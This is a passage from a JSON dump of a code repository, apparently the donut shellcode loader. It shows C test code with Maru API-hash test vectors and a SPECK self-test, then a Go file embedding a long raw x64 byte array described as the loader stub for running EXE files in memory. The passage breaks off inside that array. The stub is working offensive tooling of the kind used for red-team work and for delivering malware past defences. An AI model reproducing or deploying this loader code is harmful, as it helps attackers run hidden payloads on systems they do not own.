0x79FBDCFC2ECE09FF},\n{\"NFFMNM3CF3NXY6P9MCC7YPX\", 0x10B7C56D102D623B},\n{\"R74YN9MX7PMP364HYNYCR9FY\", 0x86EC8AA614611458},\n{\"94X3NFT7W4FPTX3MCTY99HMPR\", 0x7929169892B04FC1},\n{\"66R379FR67W7T7H79WTCF37H6Y\", 0xBEA85FD3754045D8},\n{\"4F6HFPT3NRN7WPP766RFCXR43RX\", 0x76E410266A6830A},\n{\"HP374TWWPMYRTTWC6Y6T4C4T4HP4\", 0x6A7509443FF48F74},\n{\"TTX3966P63XPYMPM6XM994TX9X9X3\", 0xA8AFC37C137AE14},\n{\"34TX7XRX4WH7T6PW439TNRY77FHPT4\", 0xE64667746B53394},\n{\"P3WRCCT4PXN3H6PMNR3YXY6X379MTXH\", 0xCE981B296791D5C7},\n{\"73YF99H9XXTYC6XF6CXTPCM4YXYN33R4\", 0xE39B1FC51BED4BA9},\n{\"T7R3PR43C93MH4TRT6M644T7RCXMX4WM6\", 0xE25C6B39CB28FDB5},\n{\"44M69YYFX3C9H9M6P46933PW34RRCM9NXX\", 0x84DBD675600E871E},\n{\"7TW7P76CXMFC3HFTFHMWXWW33TWTPT6PYP3\", 0xE00F660E699F9231},\n{\"6CH6W7WYHH7HXT7RTMW4FRCN39HR997F6FWN\", 0x32AEC917C63A878E},\n{\"WF3HNPT37XPPXYFXR447F7RWF3C69H74CT6R6\", 0x4B4FCD2604496365},\n{\"WR9CCHH9NNNXCXYMXMFFW6YYC7449M4HYXM4MC\", 0x330DA5A18A58C952},\n{\"C9993Y93PTWYRNP46PYN763RNFYP4PN4WWHR9CM\", 0x5249D03CD52C71DB},\n{\"XNPXCY47FWWMTFF6R7RWNX79MC4YN43M9RYCC4RX\", 0xF11E92E74F70C4F4},\n{\"3RPX6MFNCWPMPT3M467HWCYCHH9PM7R6MFWXYXNTN\", 0x86C8BD9789AA71BE},\n{\"633MWRYMCYF3TTCRP6HXTR9TTX43T3MYXPPWMWFMF6\", 0xA5F12FC7418615CC},\n{\"RW7NN6Y4779639NNTHN6TR939F3799FNWTH4FP46RNY\", 0x37EADA4549B0B96F},\n{\"MCTRH9PTXRXFPMYRP9Y4TC4PCRX4W9YFCW649R3YN33W\", 0x8E5BADDF84BB9779},\n{\"F7RT3H36PNH6CF9TWCRNYMFWX9M9MTTNY6C7X43HC4PN9\", 0x8040D317E8DCD294},\n{\"7HTCNCTNHRFY6HCRTYPTHYP3H9T4PR96RWRY7NRPTMH936\", 0x151FB43ECC51AFA1},\n{\"NYRMPMYCWXTPRCYM9TX6Y4XTMY9RT3PHH49PP36H7XR7WPN\", 0x650A8724A052DFC5},\n{\"6PX3XWM3X973693M4F373R3N9FNC4CCTXN3CTTYMP3NW4C49\", 0x9E48D8154522BFDD},\n{\"74RNX9MTPW7FNY9WMTXNPPRMR97PRPPRCN3CMHPNWFFW44R3C\", 0xDC1ABDA05084DCBA},\n{\"47NC63XRTXXPWHN76H9XF9R7TTHWR6T7XMF9TMCHP4FX4WCYTT\", 0x5DC075A21ECF2DD8},\n{\"TYMXHXC4N6XXTR4T7X37PHWTYXFF9M7MXP6477RW4FM7P9PFXFR\", 0x2CD151D5D71FA785},\n{\"MRPW7NCXPT4N7YN3WN7P9WYNY3PPR464WR7P7PP37MXFF9FC7WTH\", 0x7B88469D5AFE14D9},\n{\"9XW6RYX6NTYC4NCRR7YRTWM7HWNFXRT4P396CYMFPRNTRW3X69R39\", 0x81E069528C3C9BEE},\n{\"9NMRWF4W34MHWTPP74RY34YWMT94H76HTRX34MR7C9MF696M3TXMN3\", 0x4D19A0CB3BC48BFF},\n{\"HF6FM9RMT3NPMR37TX3FPTFYRFNXTMHWTF7WN94YNP4TMP3FNHM3N9F\", 0x30CEBE63BE4E30F1},\n{\"NW7CCWFTTNFPMTY3H6X96HX6MXY67W3RPTRCCWHWPYPC7PPRF74PH7RC\", 0x64F3DF1E551B22BE},\n{\"HFH43PM9TNCCW79XCMW79HYCN4HY6MT9MFFRYRXYX4H3P9T9FHF6NWC3C\", 0xEF36678895FBB3A8},\n{\"N7WH9WYMNHYY3C3RRFTW3RNYH3C646C97FTPT3MH7TMW6MTC4PT44NWCWH\", 0x1B75D90E82D98E1D},\n{\"663F4T7PMWN996R9FYWRY3Y33HCNFH6PRWF9TPHN363YFFF6C9CHTP3XNXP\", 0x25767AD747B833D6},\n{\"3P7934TX6CFHPM6TWY6H4CXT47P4XRMFTPNMCFP9H9F4MPFWWF9XRMPHFCYX\", 0x1F3E15CB56A60E93},\n{\"WW6YN7NXTH9TRT4PYW9W3WTNP9XMHP6Y3NPX7R93Y763M9HRHWTN93W3M9WX3\", 0x744735578C4F6EF2},\n{\"HT6R4P6P7T4YFYYX3H3F49XYMPCPMWNT6R3PHTM47PTHTRCN9XMFHHYTH7TMPY\", 0x559EA0D5309795E6},\n{\"NHP9Y96YYF44H7NN33WYYC364CY3W4FNF6F7WTHN6WFF6RXXRWNRFF4T9XF934N\", 0xBE7F06CC36982F52},\n};\n\nvoid bin2hex(const char *str, void *bin, int len) {\n    int i;\n    uint8_t *p = (uint8_t*)bin;\n    \n    printf(\"%s[%i] = { \", str, len);\n    \n    for(i=0;i<len;i++) {\n      printf(\"0x%02x\", p[i]);\n      if((i+1) != len) putchar(',');\n    }\n    printf(\" };\\n\");\n}\n\n// returns 1 on success else <=0\nstatic int CreateRandom(void *buf, uint64_t len) {\n    \n#if defined(WINDOWS)\n    HCRYPTPROV prov;\n    int        ok;\n    \n    // 1. acquire crypto context\n    if(!CryptAcquireContext(\n        &prov, NULL, NULL,\n        PROV_RSA_AES,\n        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;\n\n    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);\n    CryptReleaseContext(prov, 0);\n    \n    return ok;\n#else\n    int      fd;\n    uint64_t r=0;\n    uint8_t  *p=(uint8_t*)buf;\n    \n    fd = open(\"/dev/urandom\", O_RDONLY);\n    \n    if(fd > 0) {\n      for(r=0; r<len; r++, p++) {\n        if(read(fd, p, 1) != 1) break;\n      }\n      close(fd);\n    }\n    return r == len;\n#endif\n}\n\n// Generate a random string, not exceeding MARU_MAX_STR bytes\n// tbl is from https://stackoverflow.com/a/27459196\nstatic int GenRandomString(void *output, uint64_t len) {\n    uint8_t rnd[MARU_MAX_STR];\n    int     i;\n    char    tbl[]=\"HMN34P67R9TWCXYF\"; \n    char    *str = (char*)output;\n    \n    if(len > (MARU_MAX_STR - 1)) return 0;\n    \n    // generate MARU_MAX_STR random bytes\n    if(!CreateRandom(rnd, MARU_MAX_STR)) return 0;\n    \n    // generate a string using unambiguous characters\n    for(i=0; i<len; i++) {\n      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];\n    }\n    str[i] = 0;\n    return 1;\n}\n    \nvoid gen_maru_tv(void) {\n    char str[MARU_MAX_STR+1];\n    w64  h, iv;\n    int  i;\n    \n    // copy 64-bit IV (just using the speck ciphertext)\n    memcpy(iv.b, cipher64, 8);\n    \n    // create vectors\n    for(i=0; i<MARU_MAX_STR; i++) {\n      // generate a random string\n      memset(str, 0, sizeof(str));\n      GenRandomString(str, i);\n      \n      // derive a hash for string\n      h.q = maru(str, iv.q);\n      \n      printf(\"{\\\"%s\\\", 0x%llX},\\n\", str, h.q);\n    }\n}\n\nint main(int argc, char *argv[]) {\n    int i, equ;\n    w64 p, c, h, iv;\n    \n    // copy 64-bit plaintext\n    memcpy(p.b, plain64, 8);\n    \n    // encrypt in-place with 128-bit key\n    c.q = speck(key64, p.q);\n    equ = (memcmp(c.b, cipher64, 8)==0);\n    printf(\"SPECK-64/128 Test : %s\\n\\n\", equ ? \"OK\" : \"FAILED\");\n    \n    // set iv\n    memcpy(iv.b, cipher64, 8);\n    \n    // compare test vectors\n    for(i=0; i<MARU_MAX_STR; i++) {\n      h.q = maru(maru_tv[i].str, iv.q);\n      \n      if(maru_tv[i].hash != h.q) {\n        printf(\"Maru test # %i failed.\\n\", i);\n        break;\n      }\n    }\n    if(i == MARU_MAX_STR) printf(\"Maru tests OK\\n\");\n    return 0;\n}\n#endif\n"
        },
        {
          "name": "img",
          "type": "tree",
          "content": null
        },
        {
          "name": "include",
          "type": "tree",
          "content": null
        },
        {
          "name": "lib",
          "type": "tree",
          "content": null
        },
        {
          "name": "loader",
          "type": "tree",
          "content": null
        },
        {
          "name": "loader_exe_x64.go",
          "type": "blob",
          "size": 82.05859375,
          "content": "package donut\n\n// LOADER_EXE_X64 - stub for EXE PE files\nvar LOADER_EXE_X64 = []byte{\n\n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, \n  0x74, 0x24, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0x00, \n  0x05, 0x00, 0x00, 0x33, 0xff, 0x48, 0x8b, 0xd9, 0x39, 0xb9, 0x38, 0x02, \n  0x00, 0x00, 0x0f, 0x84, 0xce, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x41, 0x28, \n  0x48, 0x8b, 0x91, 0x88, 0x00, 0x00, 0x00, 0xe8, 0x34, 0x2e, 0x00, 0x00, \n  0x48, 0x85, 0xc0, 0x0f, 0x84, 0xaf, 0x00, 0x00, 0x00, 0x48, 0x21, 0x7c, \n  0x24, 0x28, 0x4c, 0x8d, 0x05, 0x77, 0x13, 0x00, 0x00, 0x21, 0x7c, 0x24, \n  0x20, 0x4c, 0x8b, 0xcb, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0xd0, 0x4c, 0x8b, \n  0x43, 0x28, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x93, 0x08, 0x02, 0x00, 0x00, \n  0x48, 0x8b, 0xf8, 0xe8, 0xfc, 0x2d, 0x00, 0x00, 0x4c, 0x8b, 0x43, 0x28, \n  0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x93, 0xa0, 0x00, 0x00, 0x00, 0x4c, 0x8b, \n  0xf0, 0xe8, 0xe6, 0x2d, 0x00, 0x00, 0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, \n  0xcb, 0x48, 0x8b, 0x93, 0xa8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0xe8, \n  0xd0, 0x2d, 0x00, 0x00, 0x33, 0xc9, 0x48, 0x8b, 0xe8, 0xff, 0x53, 0x40, \n  0x4c, 0x8b, 0xf8, 0x4d, 0x85, 0xf6, 0x74, 0x4f, 0x48, 0x85, 0xf6, 0x74, \n  0x4a, 0x48, 0x85, 0xed, 0x74, 0x45, 0xc7, 0x44, 0x24, 0x60, 0x0b, 0x00, \n  0x10, 0x00, 0xff, 0xd5, 0x48, 0x8b, 0xc8, 0x48, 0x8d, 0x54, 0x24, 0x30, \n  0xff, 0xd6, 0x8b, 0x83, 0x38, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, \n  0x30, 0x48, 0x83, 0xa4, 0x24, 0xc8, 0x00, 0x00, 0x00, 0xf0, 0x49, 0x03, \n  0xc7, 0x33, 0xd2, 0x48, 0x89, 0x84, 0x24, 0x28, 0x01, 0x00, 0x00, 0x41, \n  0xff, 0xd6, 0xeb, 0x0b, 0x48, 0x83, 0xc8, 0xff, 0xeb, 0x08, 0xe8, 0xc9, \n  0x12, 0x00, 0x00, 0x48, 0x8b, 0xc7, 0x4c, 0x8d, 0x9c, 0x24, 0x00, 0x05, \n  0x00, 0x00, 0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x6b, 0x28, 0x49, 0x8b, \n  0x73, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0xcc, \n  0xf0, 0xff, 0x41, 0x08, 0x8b, 0x41, 0x08, 0xc3, 0xb8, 0x01, 0x40, 0x00, \n  0x80, 0xc3, 0xcc, 0xcc, 0x4d, 0x85, 0xc0, 0x75, 0x06, 0xb8, 0x03, 0x40, \n  0x00, 0x80, 0xc3, 0x4c, 0x8b, 0x49, 0x10, 0x49, 0x8b, 0x81, 0x30, 0x08, \n  0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x0d, 0x49, 0x8b, 0x81, 0x38, 0x08, \n  0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x74, 0x19, 0x49, 0x8b, 0x81, 0xf0, \n  0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x17, 0x49, 0x8b, 0x81, 0xf8, \n  0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x75, 0x0a, 0x49, 0x89, 0x08, \n  0xf0, 0xff, 0x41, 0x08, 0x33, 0xc0, 0xc3, 0x49, 0x83, 0x20, 0x00, 0xb8, \n  0x02, 0x40, 0x00, 0x80, 0xc3, 0xcc, 0xcc, 0xcc, 0x83, 0xc8, 0xff, 0xf0, \n  0x0f, 0xc1, 0x41, 0x08, 0xff, 0xc8, 0xc3, 0xcc, 0x33, 0xc0, 0xc3, 0xcc, \n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, \n  0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x41, \n  0x8b, 0xe8, 0x48, 0x8b, 0xf1, 0x41, 0xf6, 0xc0, 0x02, 0x74, 0x1b, 0x48, \n  0x8b, 0x5c, 0x24, 0x50, 0x48, 0x85, 0xdb, 0x74, 0x1c, 0x48, 0x8b, 0x49, \n  0x38, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x08, 0x48, 0x8b, 0x46, 0x38, 0x48, \n  0x89, 0x03, 0x40, 0xf6, 0xc5, 0x01, 0x74, 0x1c, 0x48, 0x85, 0xff, 0x75, \n  0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, 0x12, 0x48, 0x8d, 0x5e, 0x28, \n  0x48, 0x8b, 0x03, 0x48, 0x8b, 0xcb, 0xff, 0x50, 0x08, 0x48, 0x89, 0x1f, \n  0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, \n  0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, \n  0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x41, 0x58, 0x48, 0x8b, \n  0xda, 0xff, 0x50, 0x78, 0x89, 0x03, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, \n  0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x53, 0x48, 0x83, 0xec, 0x60, \n  0x83, 0x60, 0x20, 0x00, 0x48, 0x8d, 0x48, 0xb8, 0x83, 0x60, 0x18, 0x00, \n  0x48, 0x8b, 0xda, 0x83, 0x60, 0x10, 0x00, 0x33, 0xd2, 0x44, 0x8d, 0x42, \n  0x40, 0xe8, 0xbe, 0x31, 0x00, 0x00, 0x48, 0x8b, 0x03, 0x48, 0x8d, 0x54, \n  0x24, 0x20, 0x48, 0x8b, 0xcb, 0xff, 0x50, 0x18, 0x85, 0xc0, 0x75, 0x1e, \n  0x48, 0x8b, 0x03, 0x4c, 0x8d, 0x4c, 0x24, 0x78, 0x4c, 0x8d, 0x84, 0x24, \n  0x80, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0x48, 0x8d, 0x94, 0x24, 0x88, \n  0x00, 0x00, 0x00, 0xff, 0x50, 0x20, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x60, \n  0x5b, 0xc3, 0xcc, 0xcc, 0x4d, 0x8b, 0xc8, 0x4d, 0x85, 0xc0, 0x75, 0x06, \n  0xb8, 0x03, 0x40, 0x00, 0x80, 0xc3, 0x4c, 0x8b, 0x41, 0x58, 0x49, 0x8b, \n  0x80, 0x30, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x0d, 0x49, 0x8b, \n  0x80, 0x38, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x74, 0x19, 0x49, \n  0x8b, 0x80, 0xe0, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x16, 0x49, \n  0x8b, 0x80, 0xe8, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x75, 0x09, \n  0x49, 0x89, 0x09, 0xf0, 0xff, 0x41, 0x08, 0xeb, 0x24, 0x49, 0x8b, 0x80, \n  0xf0, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x1b, 0x49, 0x8b, 0x80, \n  0xf8, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x75, 0x0e, 0x48, 0x8d, \n  0x41, 0x10, 0x49, 0x89, 0x01, 0xf0, 0xff, 0x41, 0x18, 0x33, 0xc0, 0xc3, \n  0x49, 0x83, 0x21, 0x00, 0xb8, 0x02, 0x40, 0x00, 0x80, 0xc3, 0xcc, 0xcc, \n  0x48, 0x8b, 0x44, 0x24, 0x30, 0x83, 0x20, 0x00, 0x33, 0xc0, 0xc3, 0xcc, \n  0x0f, 0xaf, 0xca, 0x8b, 0xc1, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0x44, 0x24, \n  0x28, 0x83, 0x20, 0x00, 0x33, 0xc0, 0xc3, 0xcc, 0x8d, 0x04, 0x11, 0xc3, \n  0x48, 0x89, 0x5c, 0x24, 0x18, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57, \n  0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x91, 0x54, 0x03, 0x00, 0x00, 0x48, \n  0x8b, 0xd9, 0xe8, 0x91, 0x28, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, \n  0xc0, 0x75, 0x0a, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xe9, 0xe7, 0x00, 0x00, \n  0x00, 0x4c, 0x8d, 0x83, 0xc8, 0x05, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x48, \n  0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0xe8, 0x52, 0x29, 0x00, 0x00, 0x48, 0x8b, \n  0xe8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xc4, 0x00, 0x00, 0x00, 0x48, 0x8d, \n  0x3d, 0x8f, 0xff, 0xff, 0xff, 0x4c, 0x8d, 0x3d, 0x7c, 0xff, 0xff, 0xff, \n  0x41, 0x2b, 0xff, 0x0f, 0x88, 0xad, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x4c, \n  0x24, 0x50, 0x8b, 0xd7, 0x41, 0xb8, 0x40, 0x00, 0x00, 0x00, 0x44, 0x8b, \n  0xf7, 0x48, 0x8b, 0xc8, 0xff, 0x53, 0x60, 0x85, 0xc0, 0x0f, 0x84, 0x8f, \n  0x00, 0x00, 0x00, 0x44, 0x8b, 0xc7, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xcd, \n  0xe8, 0x2b, 0x30, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, 0x50, 0x4c, 0x8d, \n  0x4c, 0x24, 0x58, 0x41, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xff, 0x53, 0x60, \n  0x4c, 0x8d, 0x83, 0xd8, 0x05, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x48, 0x8b, \n  0xd6, 0x48, 0x8b, 0xcb, 0xe8, 0xdb, 0x28, 0x00, 0x00, 0x48, 0x8b, 0xf0, \n  0x48, 0x85, 0xc0, 0x74, 0x51, 0x48, 0x8d, 0x3d, 0x30, 0xff, 0xff, 0xff, \n  0x4c, 0x8d, 0x35, 0x1d, 0xff, 0xff, 0xff, 0x41, 0x2b, 0xfe, 0x78, 0x3e, \n  0x4c, 0x8d, 0x4c, 0x24, 0x50, 0x8b, 0xd7, 0x41, 0xb8, 0x40, 0x00, 0x00, \n  0x00, 0x8b, 0xef, 0x48, 0x8b, 0xc8, 0xff, 0x53, 0x60, 0x85, 0xc0, 0x74, \n  0x25, 0x44, 0x8b, 0xc7, 0x49, 0x8b, 0xd6, 0x48, 0x8b, 0xce, 0xe8, 0xc1, \n  0x2f, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, 0x50, 0x4c, 0x8d, 0x4c, 0x24, \n  0x58, 0x8b, 0xd5, 0x48, 0x8b, 0xce, 0xff, 0x53, 0x60, 0xe9, 0x11, 0xff, \n  0xff, 0xff, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x83, 0xc4, \n  0x20, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, \n  0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x48, \n  0x83, 0xec, 0x20, 0x48, 0x8d, 0x91, 0x68, 0x03, 0x00, 0x00, 0x48, 0x8b, \n  0xd9, 0xe8, 0x66, 0x27, 0x00, 0x00, 0x4c, 0x8d, 0x83, 0xe8, 0x05, 0x00, \n  0x00, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xcb, 0xe8, 0x39, \n  0x28, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x42, 0xbe, \n  0x01, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x8b, 0xd6, 0x48, \n  0x8b, 0xc8, 0x44, 0x8d, 0x46, 0x3f, 0xff, 0x53, 0x60, 0x85, 0xc0, 0x74, \n  0x28, 0x48, 0x8d, 0x93, 0x0c, 0x06, 0x00, 0x00, 0x44, 0x8b, 0xc6, 0x48, \n  0x8b, 0xcf, 0xe8, 0x2d, 0x2f, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, 0x30, \n  0x4c, 0x8d, 0x4c, 0x24, 0x38, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xff, 0x53, \n  0x60, 0x8b, 0xc6, 0xeb, 0x02, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, \n  0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, \n  0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, \n  0x57, 0x48, 0x8d, 0xac, 0x24, 0x88, 0xfd, 0xff, 0xff, 0x48, 0x81, 0xec, \n  0x78, 0x03, 0x00, 0x00, 0x45, 0x33, 0xff, 0x48, 0x8b, 0xf9, 0x44, 0x21, \n  0xbd, 0xd8, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x33, 0xd2, \n  0x33, 0xf6, 0xbb, 0x00, 0x03, 0x60, 0x04, 0x45, 0x8d, 0x77, 0x68, 0x45, \n  0x8b, 0xc6, 0xe8, 0xe1, 0x2e, 0x00, 0x00, 0xb9, 0x04, 0x01, 0x00, 0x00, \n  0x44, 0x89, 0x74, 0x24, 0x60, 0x89, 0x4d, 0x80, 0x48, 0x8d, 0x85, 0x60, \n  0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x78, 0x4c, 0x8d, 0x4c, 0x24, \n  0x60, 0x89, 0x4d, 0xb0, 0x48, 0x8d, 0x45, 0x50, 0x48, 0x89, 0x45, 0xa8, \n  0x8d, 0x4e, 0x40, 0x48, 0x8d, 0x45, 0xd0, 0x89, 0x4d, 0x90, 0x48, 0x89, \n  0x45, 0x88, 0x33, 0xd2, 0x48, 0x8d, 0x45, 0x10, 0x89, 0x4d, 0xa0, 0x48, \n  0x8d, 0x8f, 0x24, 0x09, 0x00, 0x00, 0x48, 0x89, 0x45, 0x98, 0x41, 0xb8, \n  0x00, 0x00, 0x00, 0x10, 0xff, 0x97, 0x48, 0x01, 0x00, 0x00, 0x45, 0x33, \n  0xf6, 0x85, 0xc0, 0x0f, 0x84, 0xd5, 0x03, 0x00, 0x00, 0x83, 0x7c, 0x24, \n  0x74, 0x04, 0xb8, 0x00, 0x33, 0xe0, 0x04, 0x45, 0x8b, 0xe6, 0x44, 0x89, \n  0x74, 0x24, 0x20, 0x41, 0x0f, 0x94, 0xc4, 0x0f, 0x44, 0xd8, 0x45, 0x33, \n  0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x97, 0x50, 0x01, \n  0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x85, 0xc0, 0x0f, 0x84, \n  0x9e, 0x03, 0x00, 0x00, 0x44, 0x0f, 0xb7, 0x45, 0x84, 0x48, 0x8d, 0x95, \n  0x60, 0x01, 0x00, 0x00, 0x4c, 0x89, 0x74, 0x24, 0x38, 0x45, 0x33, 0xc9, \n  0x44, 0x89, 0x74, 0x24, 0x30, 0x48, 0x8b, 0xc8, 0xc7, 0x44, 0x24, 0x28, \n  0x03, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x74, 0x24, 0x20, 0xff, 0x97, 0x58, \n  0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x4c, 0x8b, 0xe8, 0x48, \n  0x85, 0xc0, 0x0f, 0x84, 0x03, 0x03, 0x00, 0x00, 0x44, 0x39, 0x75, 0xb0, \n  0x75, 0x06, 0x66, 0xc7, 0x45, 0x50, 0x2f, 0x00, 0x4c, 0x89, 0x74, 0x24, \n  0x38, 0x4c, 0x8d, 0x45, 0x50, 0x89, 0x5c, 0x24, 0x30, 0x45, 0x33, 0xc9, \n  0x4c, 0x89, 0x74, 0x24, 0x28, 0x33, 0xd2, 0x48, 0x8b, 0xc8, 0x4c, 0x89, \n  0x74, 0x24, 0x20, 0xff, 0x97, 0x80, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0xf0, \n  0x48, 0x85, 0xc0, 0x0f, 0x84, 0xba, 0x02, 0x00, 0x00, 0x45, 0x85, 0xe4, \n  0x74, 0x26, 0x0f, 0xba, 0xe3, 0x0c, 0x73, 0x20, 0x41, 0xb9, 0x04, 0x00, \n  0x00, 0x00, 0xc7, 0x44, 0x24, 0x50, 0x80, 0x33, 0x00, 0x00, 0x4c, 0x8d, \n  0x44, 0x24, 0x50, 0x48, 0x8b, 0xc8, 0x41, 0x8d, 0x51, 0x1b, 0xff, 0x97, \n  0x60, 0x01, 0x00, 0x00, 0x44, 0x8b, 0x4d, 0x90, 0x33, 0xdb, 0x45, 0x85, \n  0xc9, 0x74, 0x12, 0x4c, 0x8b, 0x45, 0x88, 0x8d, 0x53, 0x1c, 0x49, 0x8b, \n  0xce, 0xff, 0x97, 0x60, 0x01, 0x00, 0x00, 0x8b, 0xf0, 0x44, 0x8b, 0x4d, \n  0xa0, 0x45, 0x85, 0xc9, 0x74, 0x14, 0x4c, 0x8b, 0x45, 0x98, 0xba, 0x1d, \n  0x00, 0x00, 0x00, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x60, 0x01, 0x00, 0x00, \n  0x8b, 0xf0, 0x45, 0x33, 0xc9, 0x89, 0x5c, 0x24, 0x20, 0x45, 0x33, 0xc0, \n  0x33, 0xd2, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x88, 0x01, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x84, 0x2f, 0x02, 0x00, 0x00, 0x4c, 0x8d, 0x8d, 0xd0, 0x02, \n  0x00, 0x00, 0xc7, 0x85, 0xd0, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, \n  0x4c, 0x8d, 0x85, 0xd8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x5c, 0x24, 0x20, \n  0xba, 0x13, 0x00, 0x00, 0x20, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x90, 0x01, \n  0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xfc, 0x01, 0x00, 0x00, 0x81, 0xbd, \n  0xd8, 0x02, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0x0f, 0x85, 0xec, 0x01, \n  0x00, 0x00, 0x4c, 0x8d, 0x8d, 0xd0, 0x02, 0x00, 0x00, 0xc7, 0x85, 0xd0, \n  0x02, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x85, 0xc0, 0x02, \n  0x00, 0x00, 0x89, 0x9d, 0xc0, 0x02, 0x00, 0x00, 0xba, 0x05, 0x00, 0x00, \n  0x20, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x90, \n  0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xee, 0x00, 0x00, 0x00, 0xff, \n  0x97, 0xe8, 0x00, 0x00, 0x00, 0x3d, 0x76, 0x2f, 0x00, 0x00, 0x0f, 0x85, \n  0xa2, 0x01, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x89, 0x9d, 0xc0, 0x02, 0x00, \n  0x00, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0x95, 0xc8, 0x02, 0x00, 0x00, 0x49, \n  0x8b, 0xce, 0xff, 0x97, 0x78, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, \n  0x7e, 0x01, 0x00, 0x00, 0x41, 0xbc, 0x01, 0x00, 0x00, 0x00, 0x8b, 0x8d, \n  0xc8, 0x02, 0x00, 0x00, 0x85, 0xc9, 0x0f, 0x84, 0x93, 0x00, 0x00, 0x00, \n  0x48, 0x8b, 0x97, 0xd8, 0x00, 0x00, 0x00, 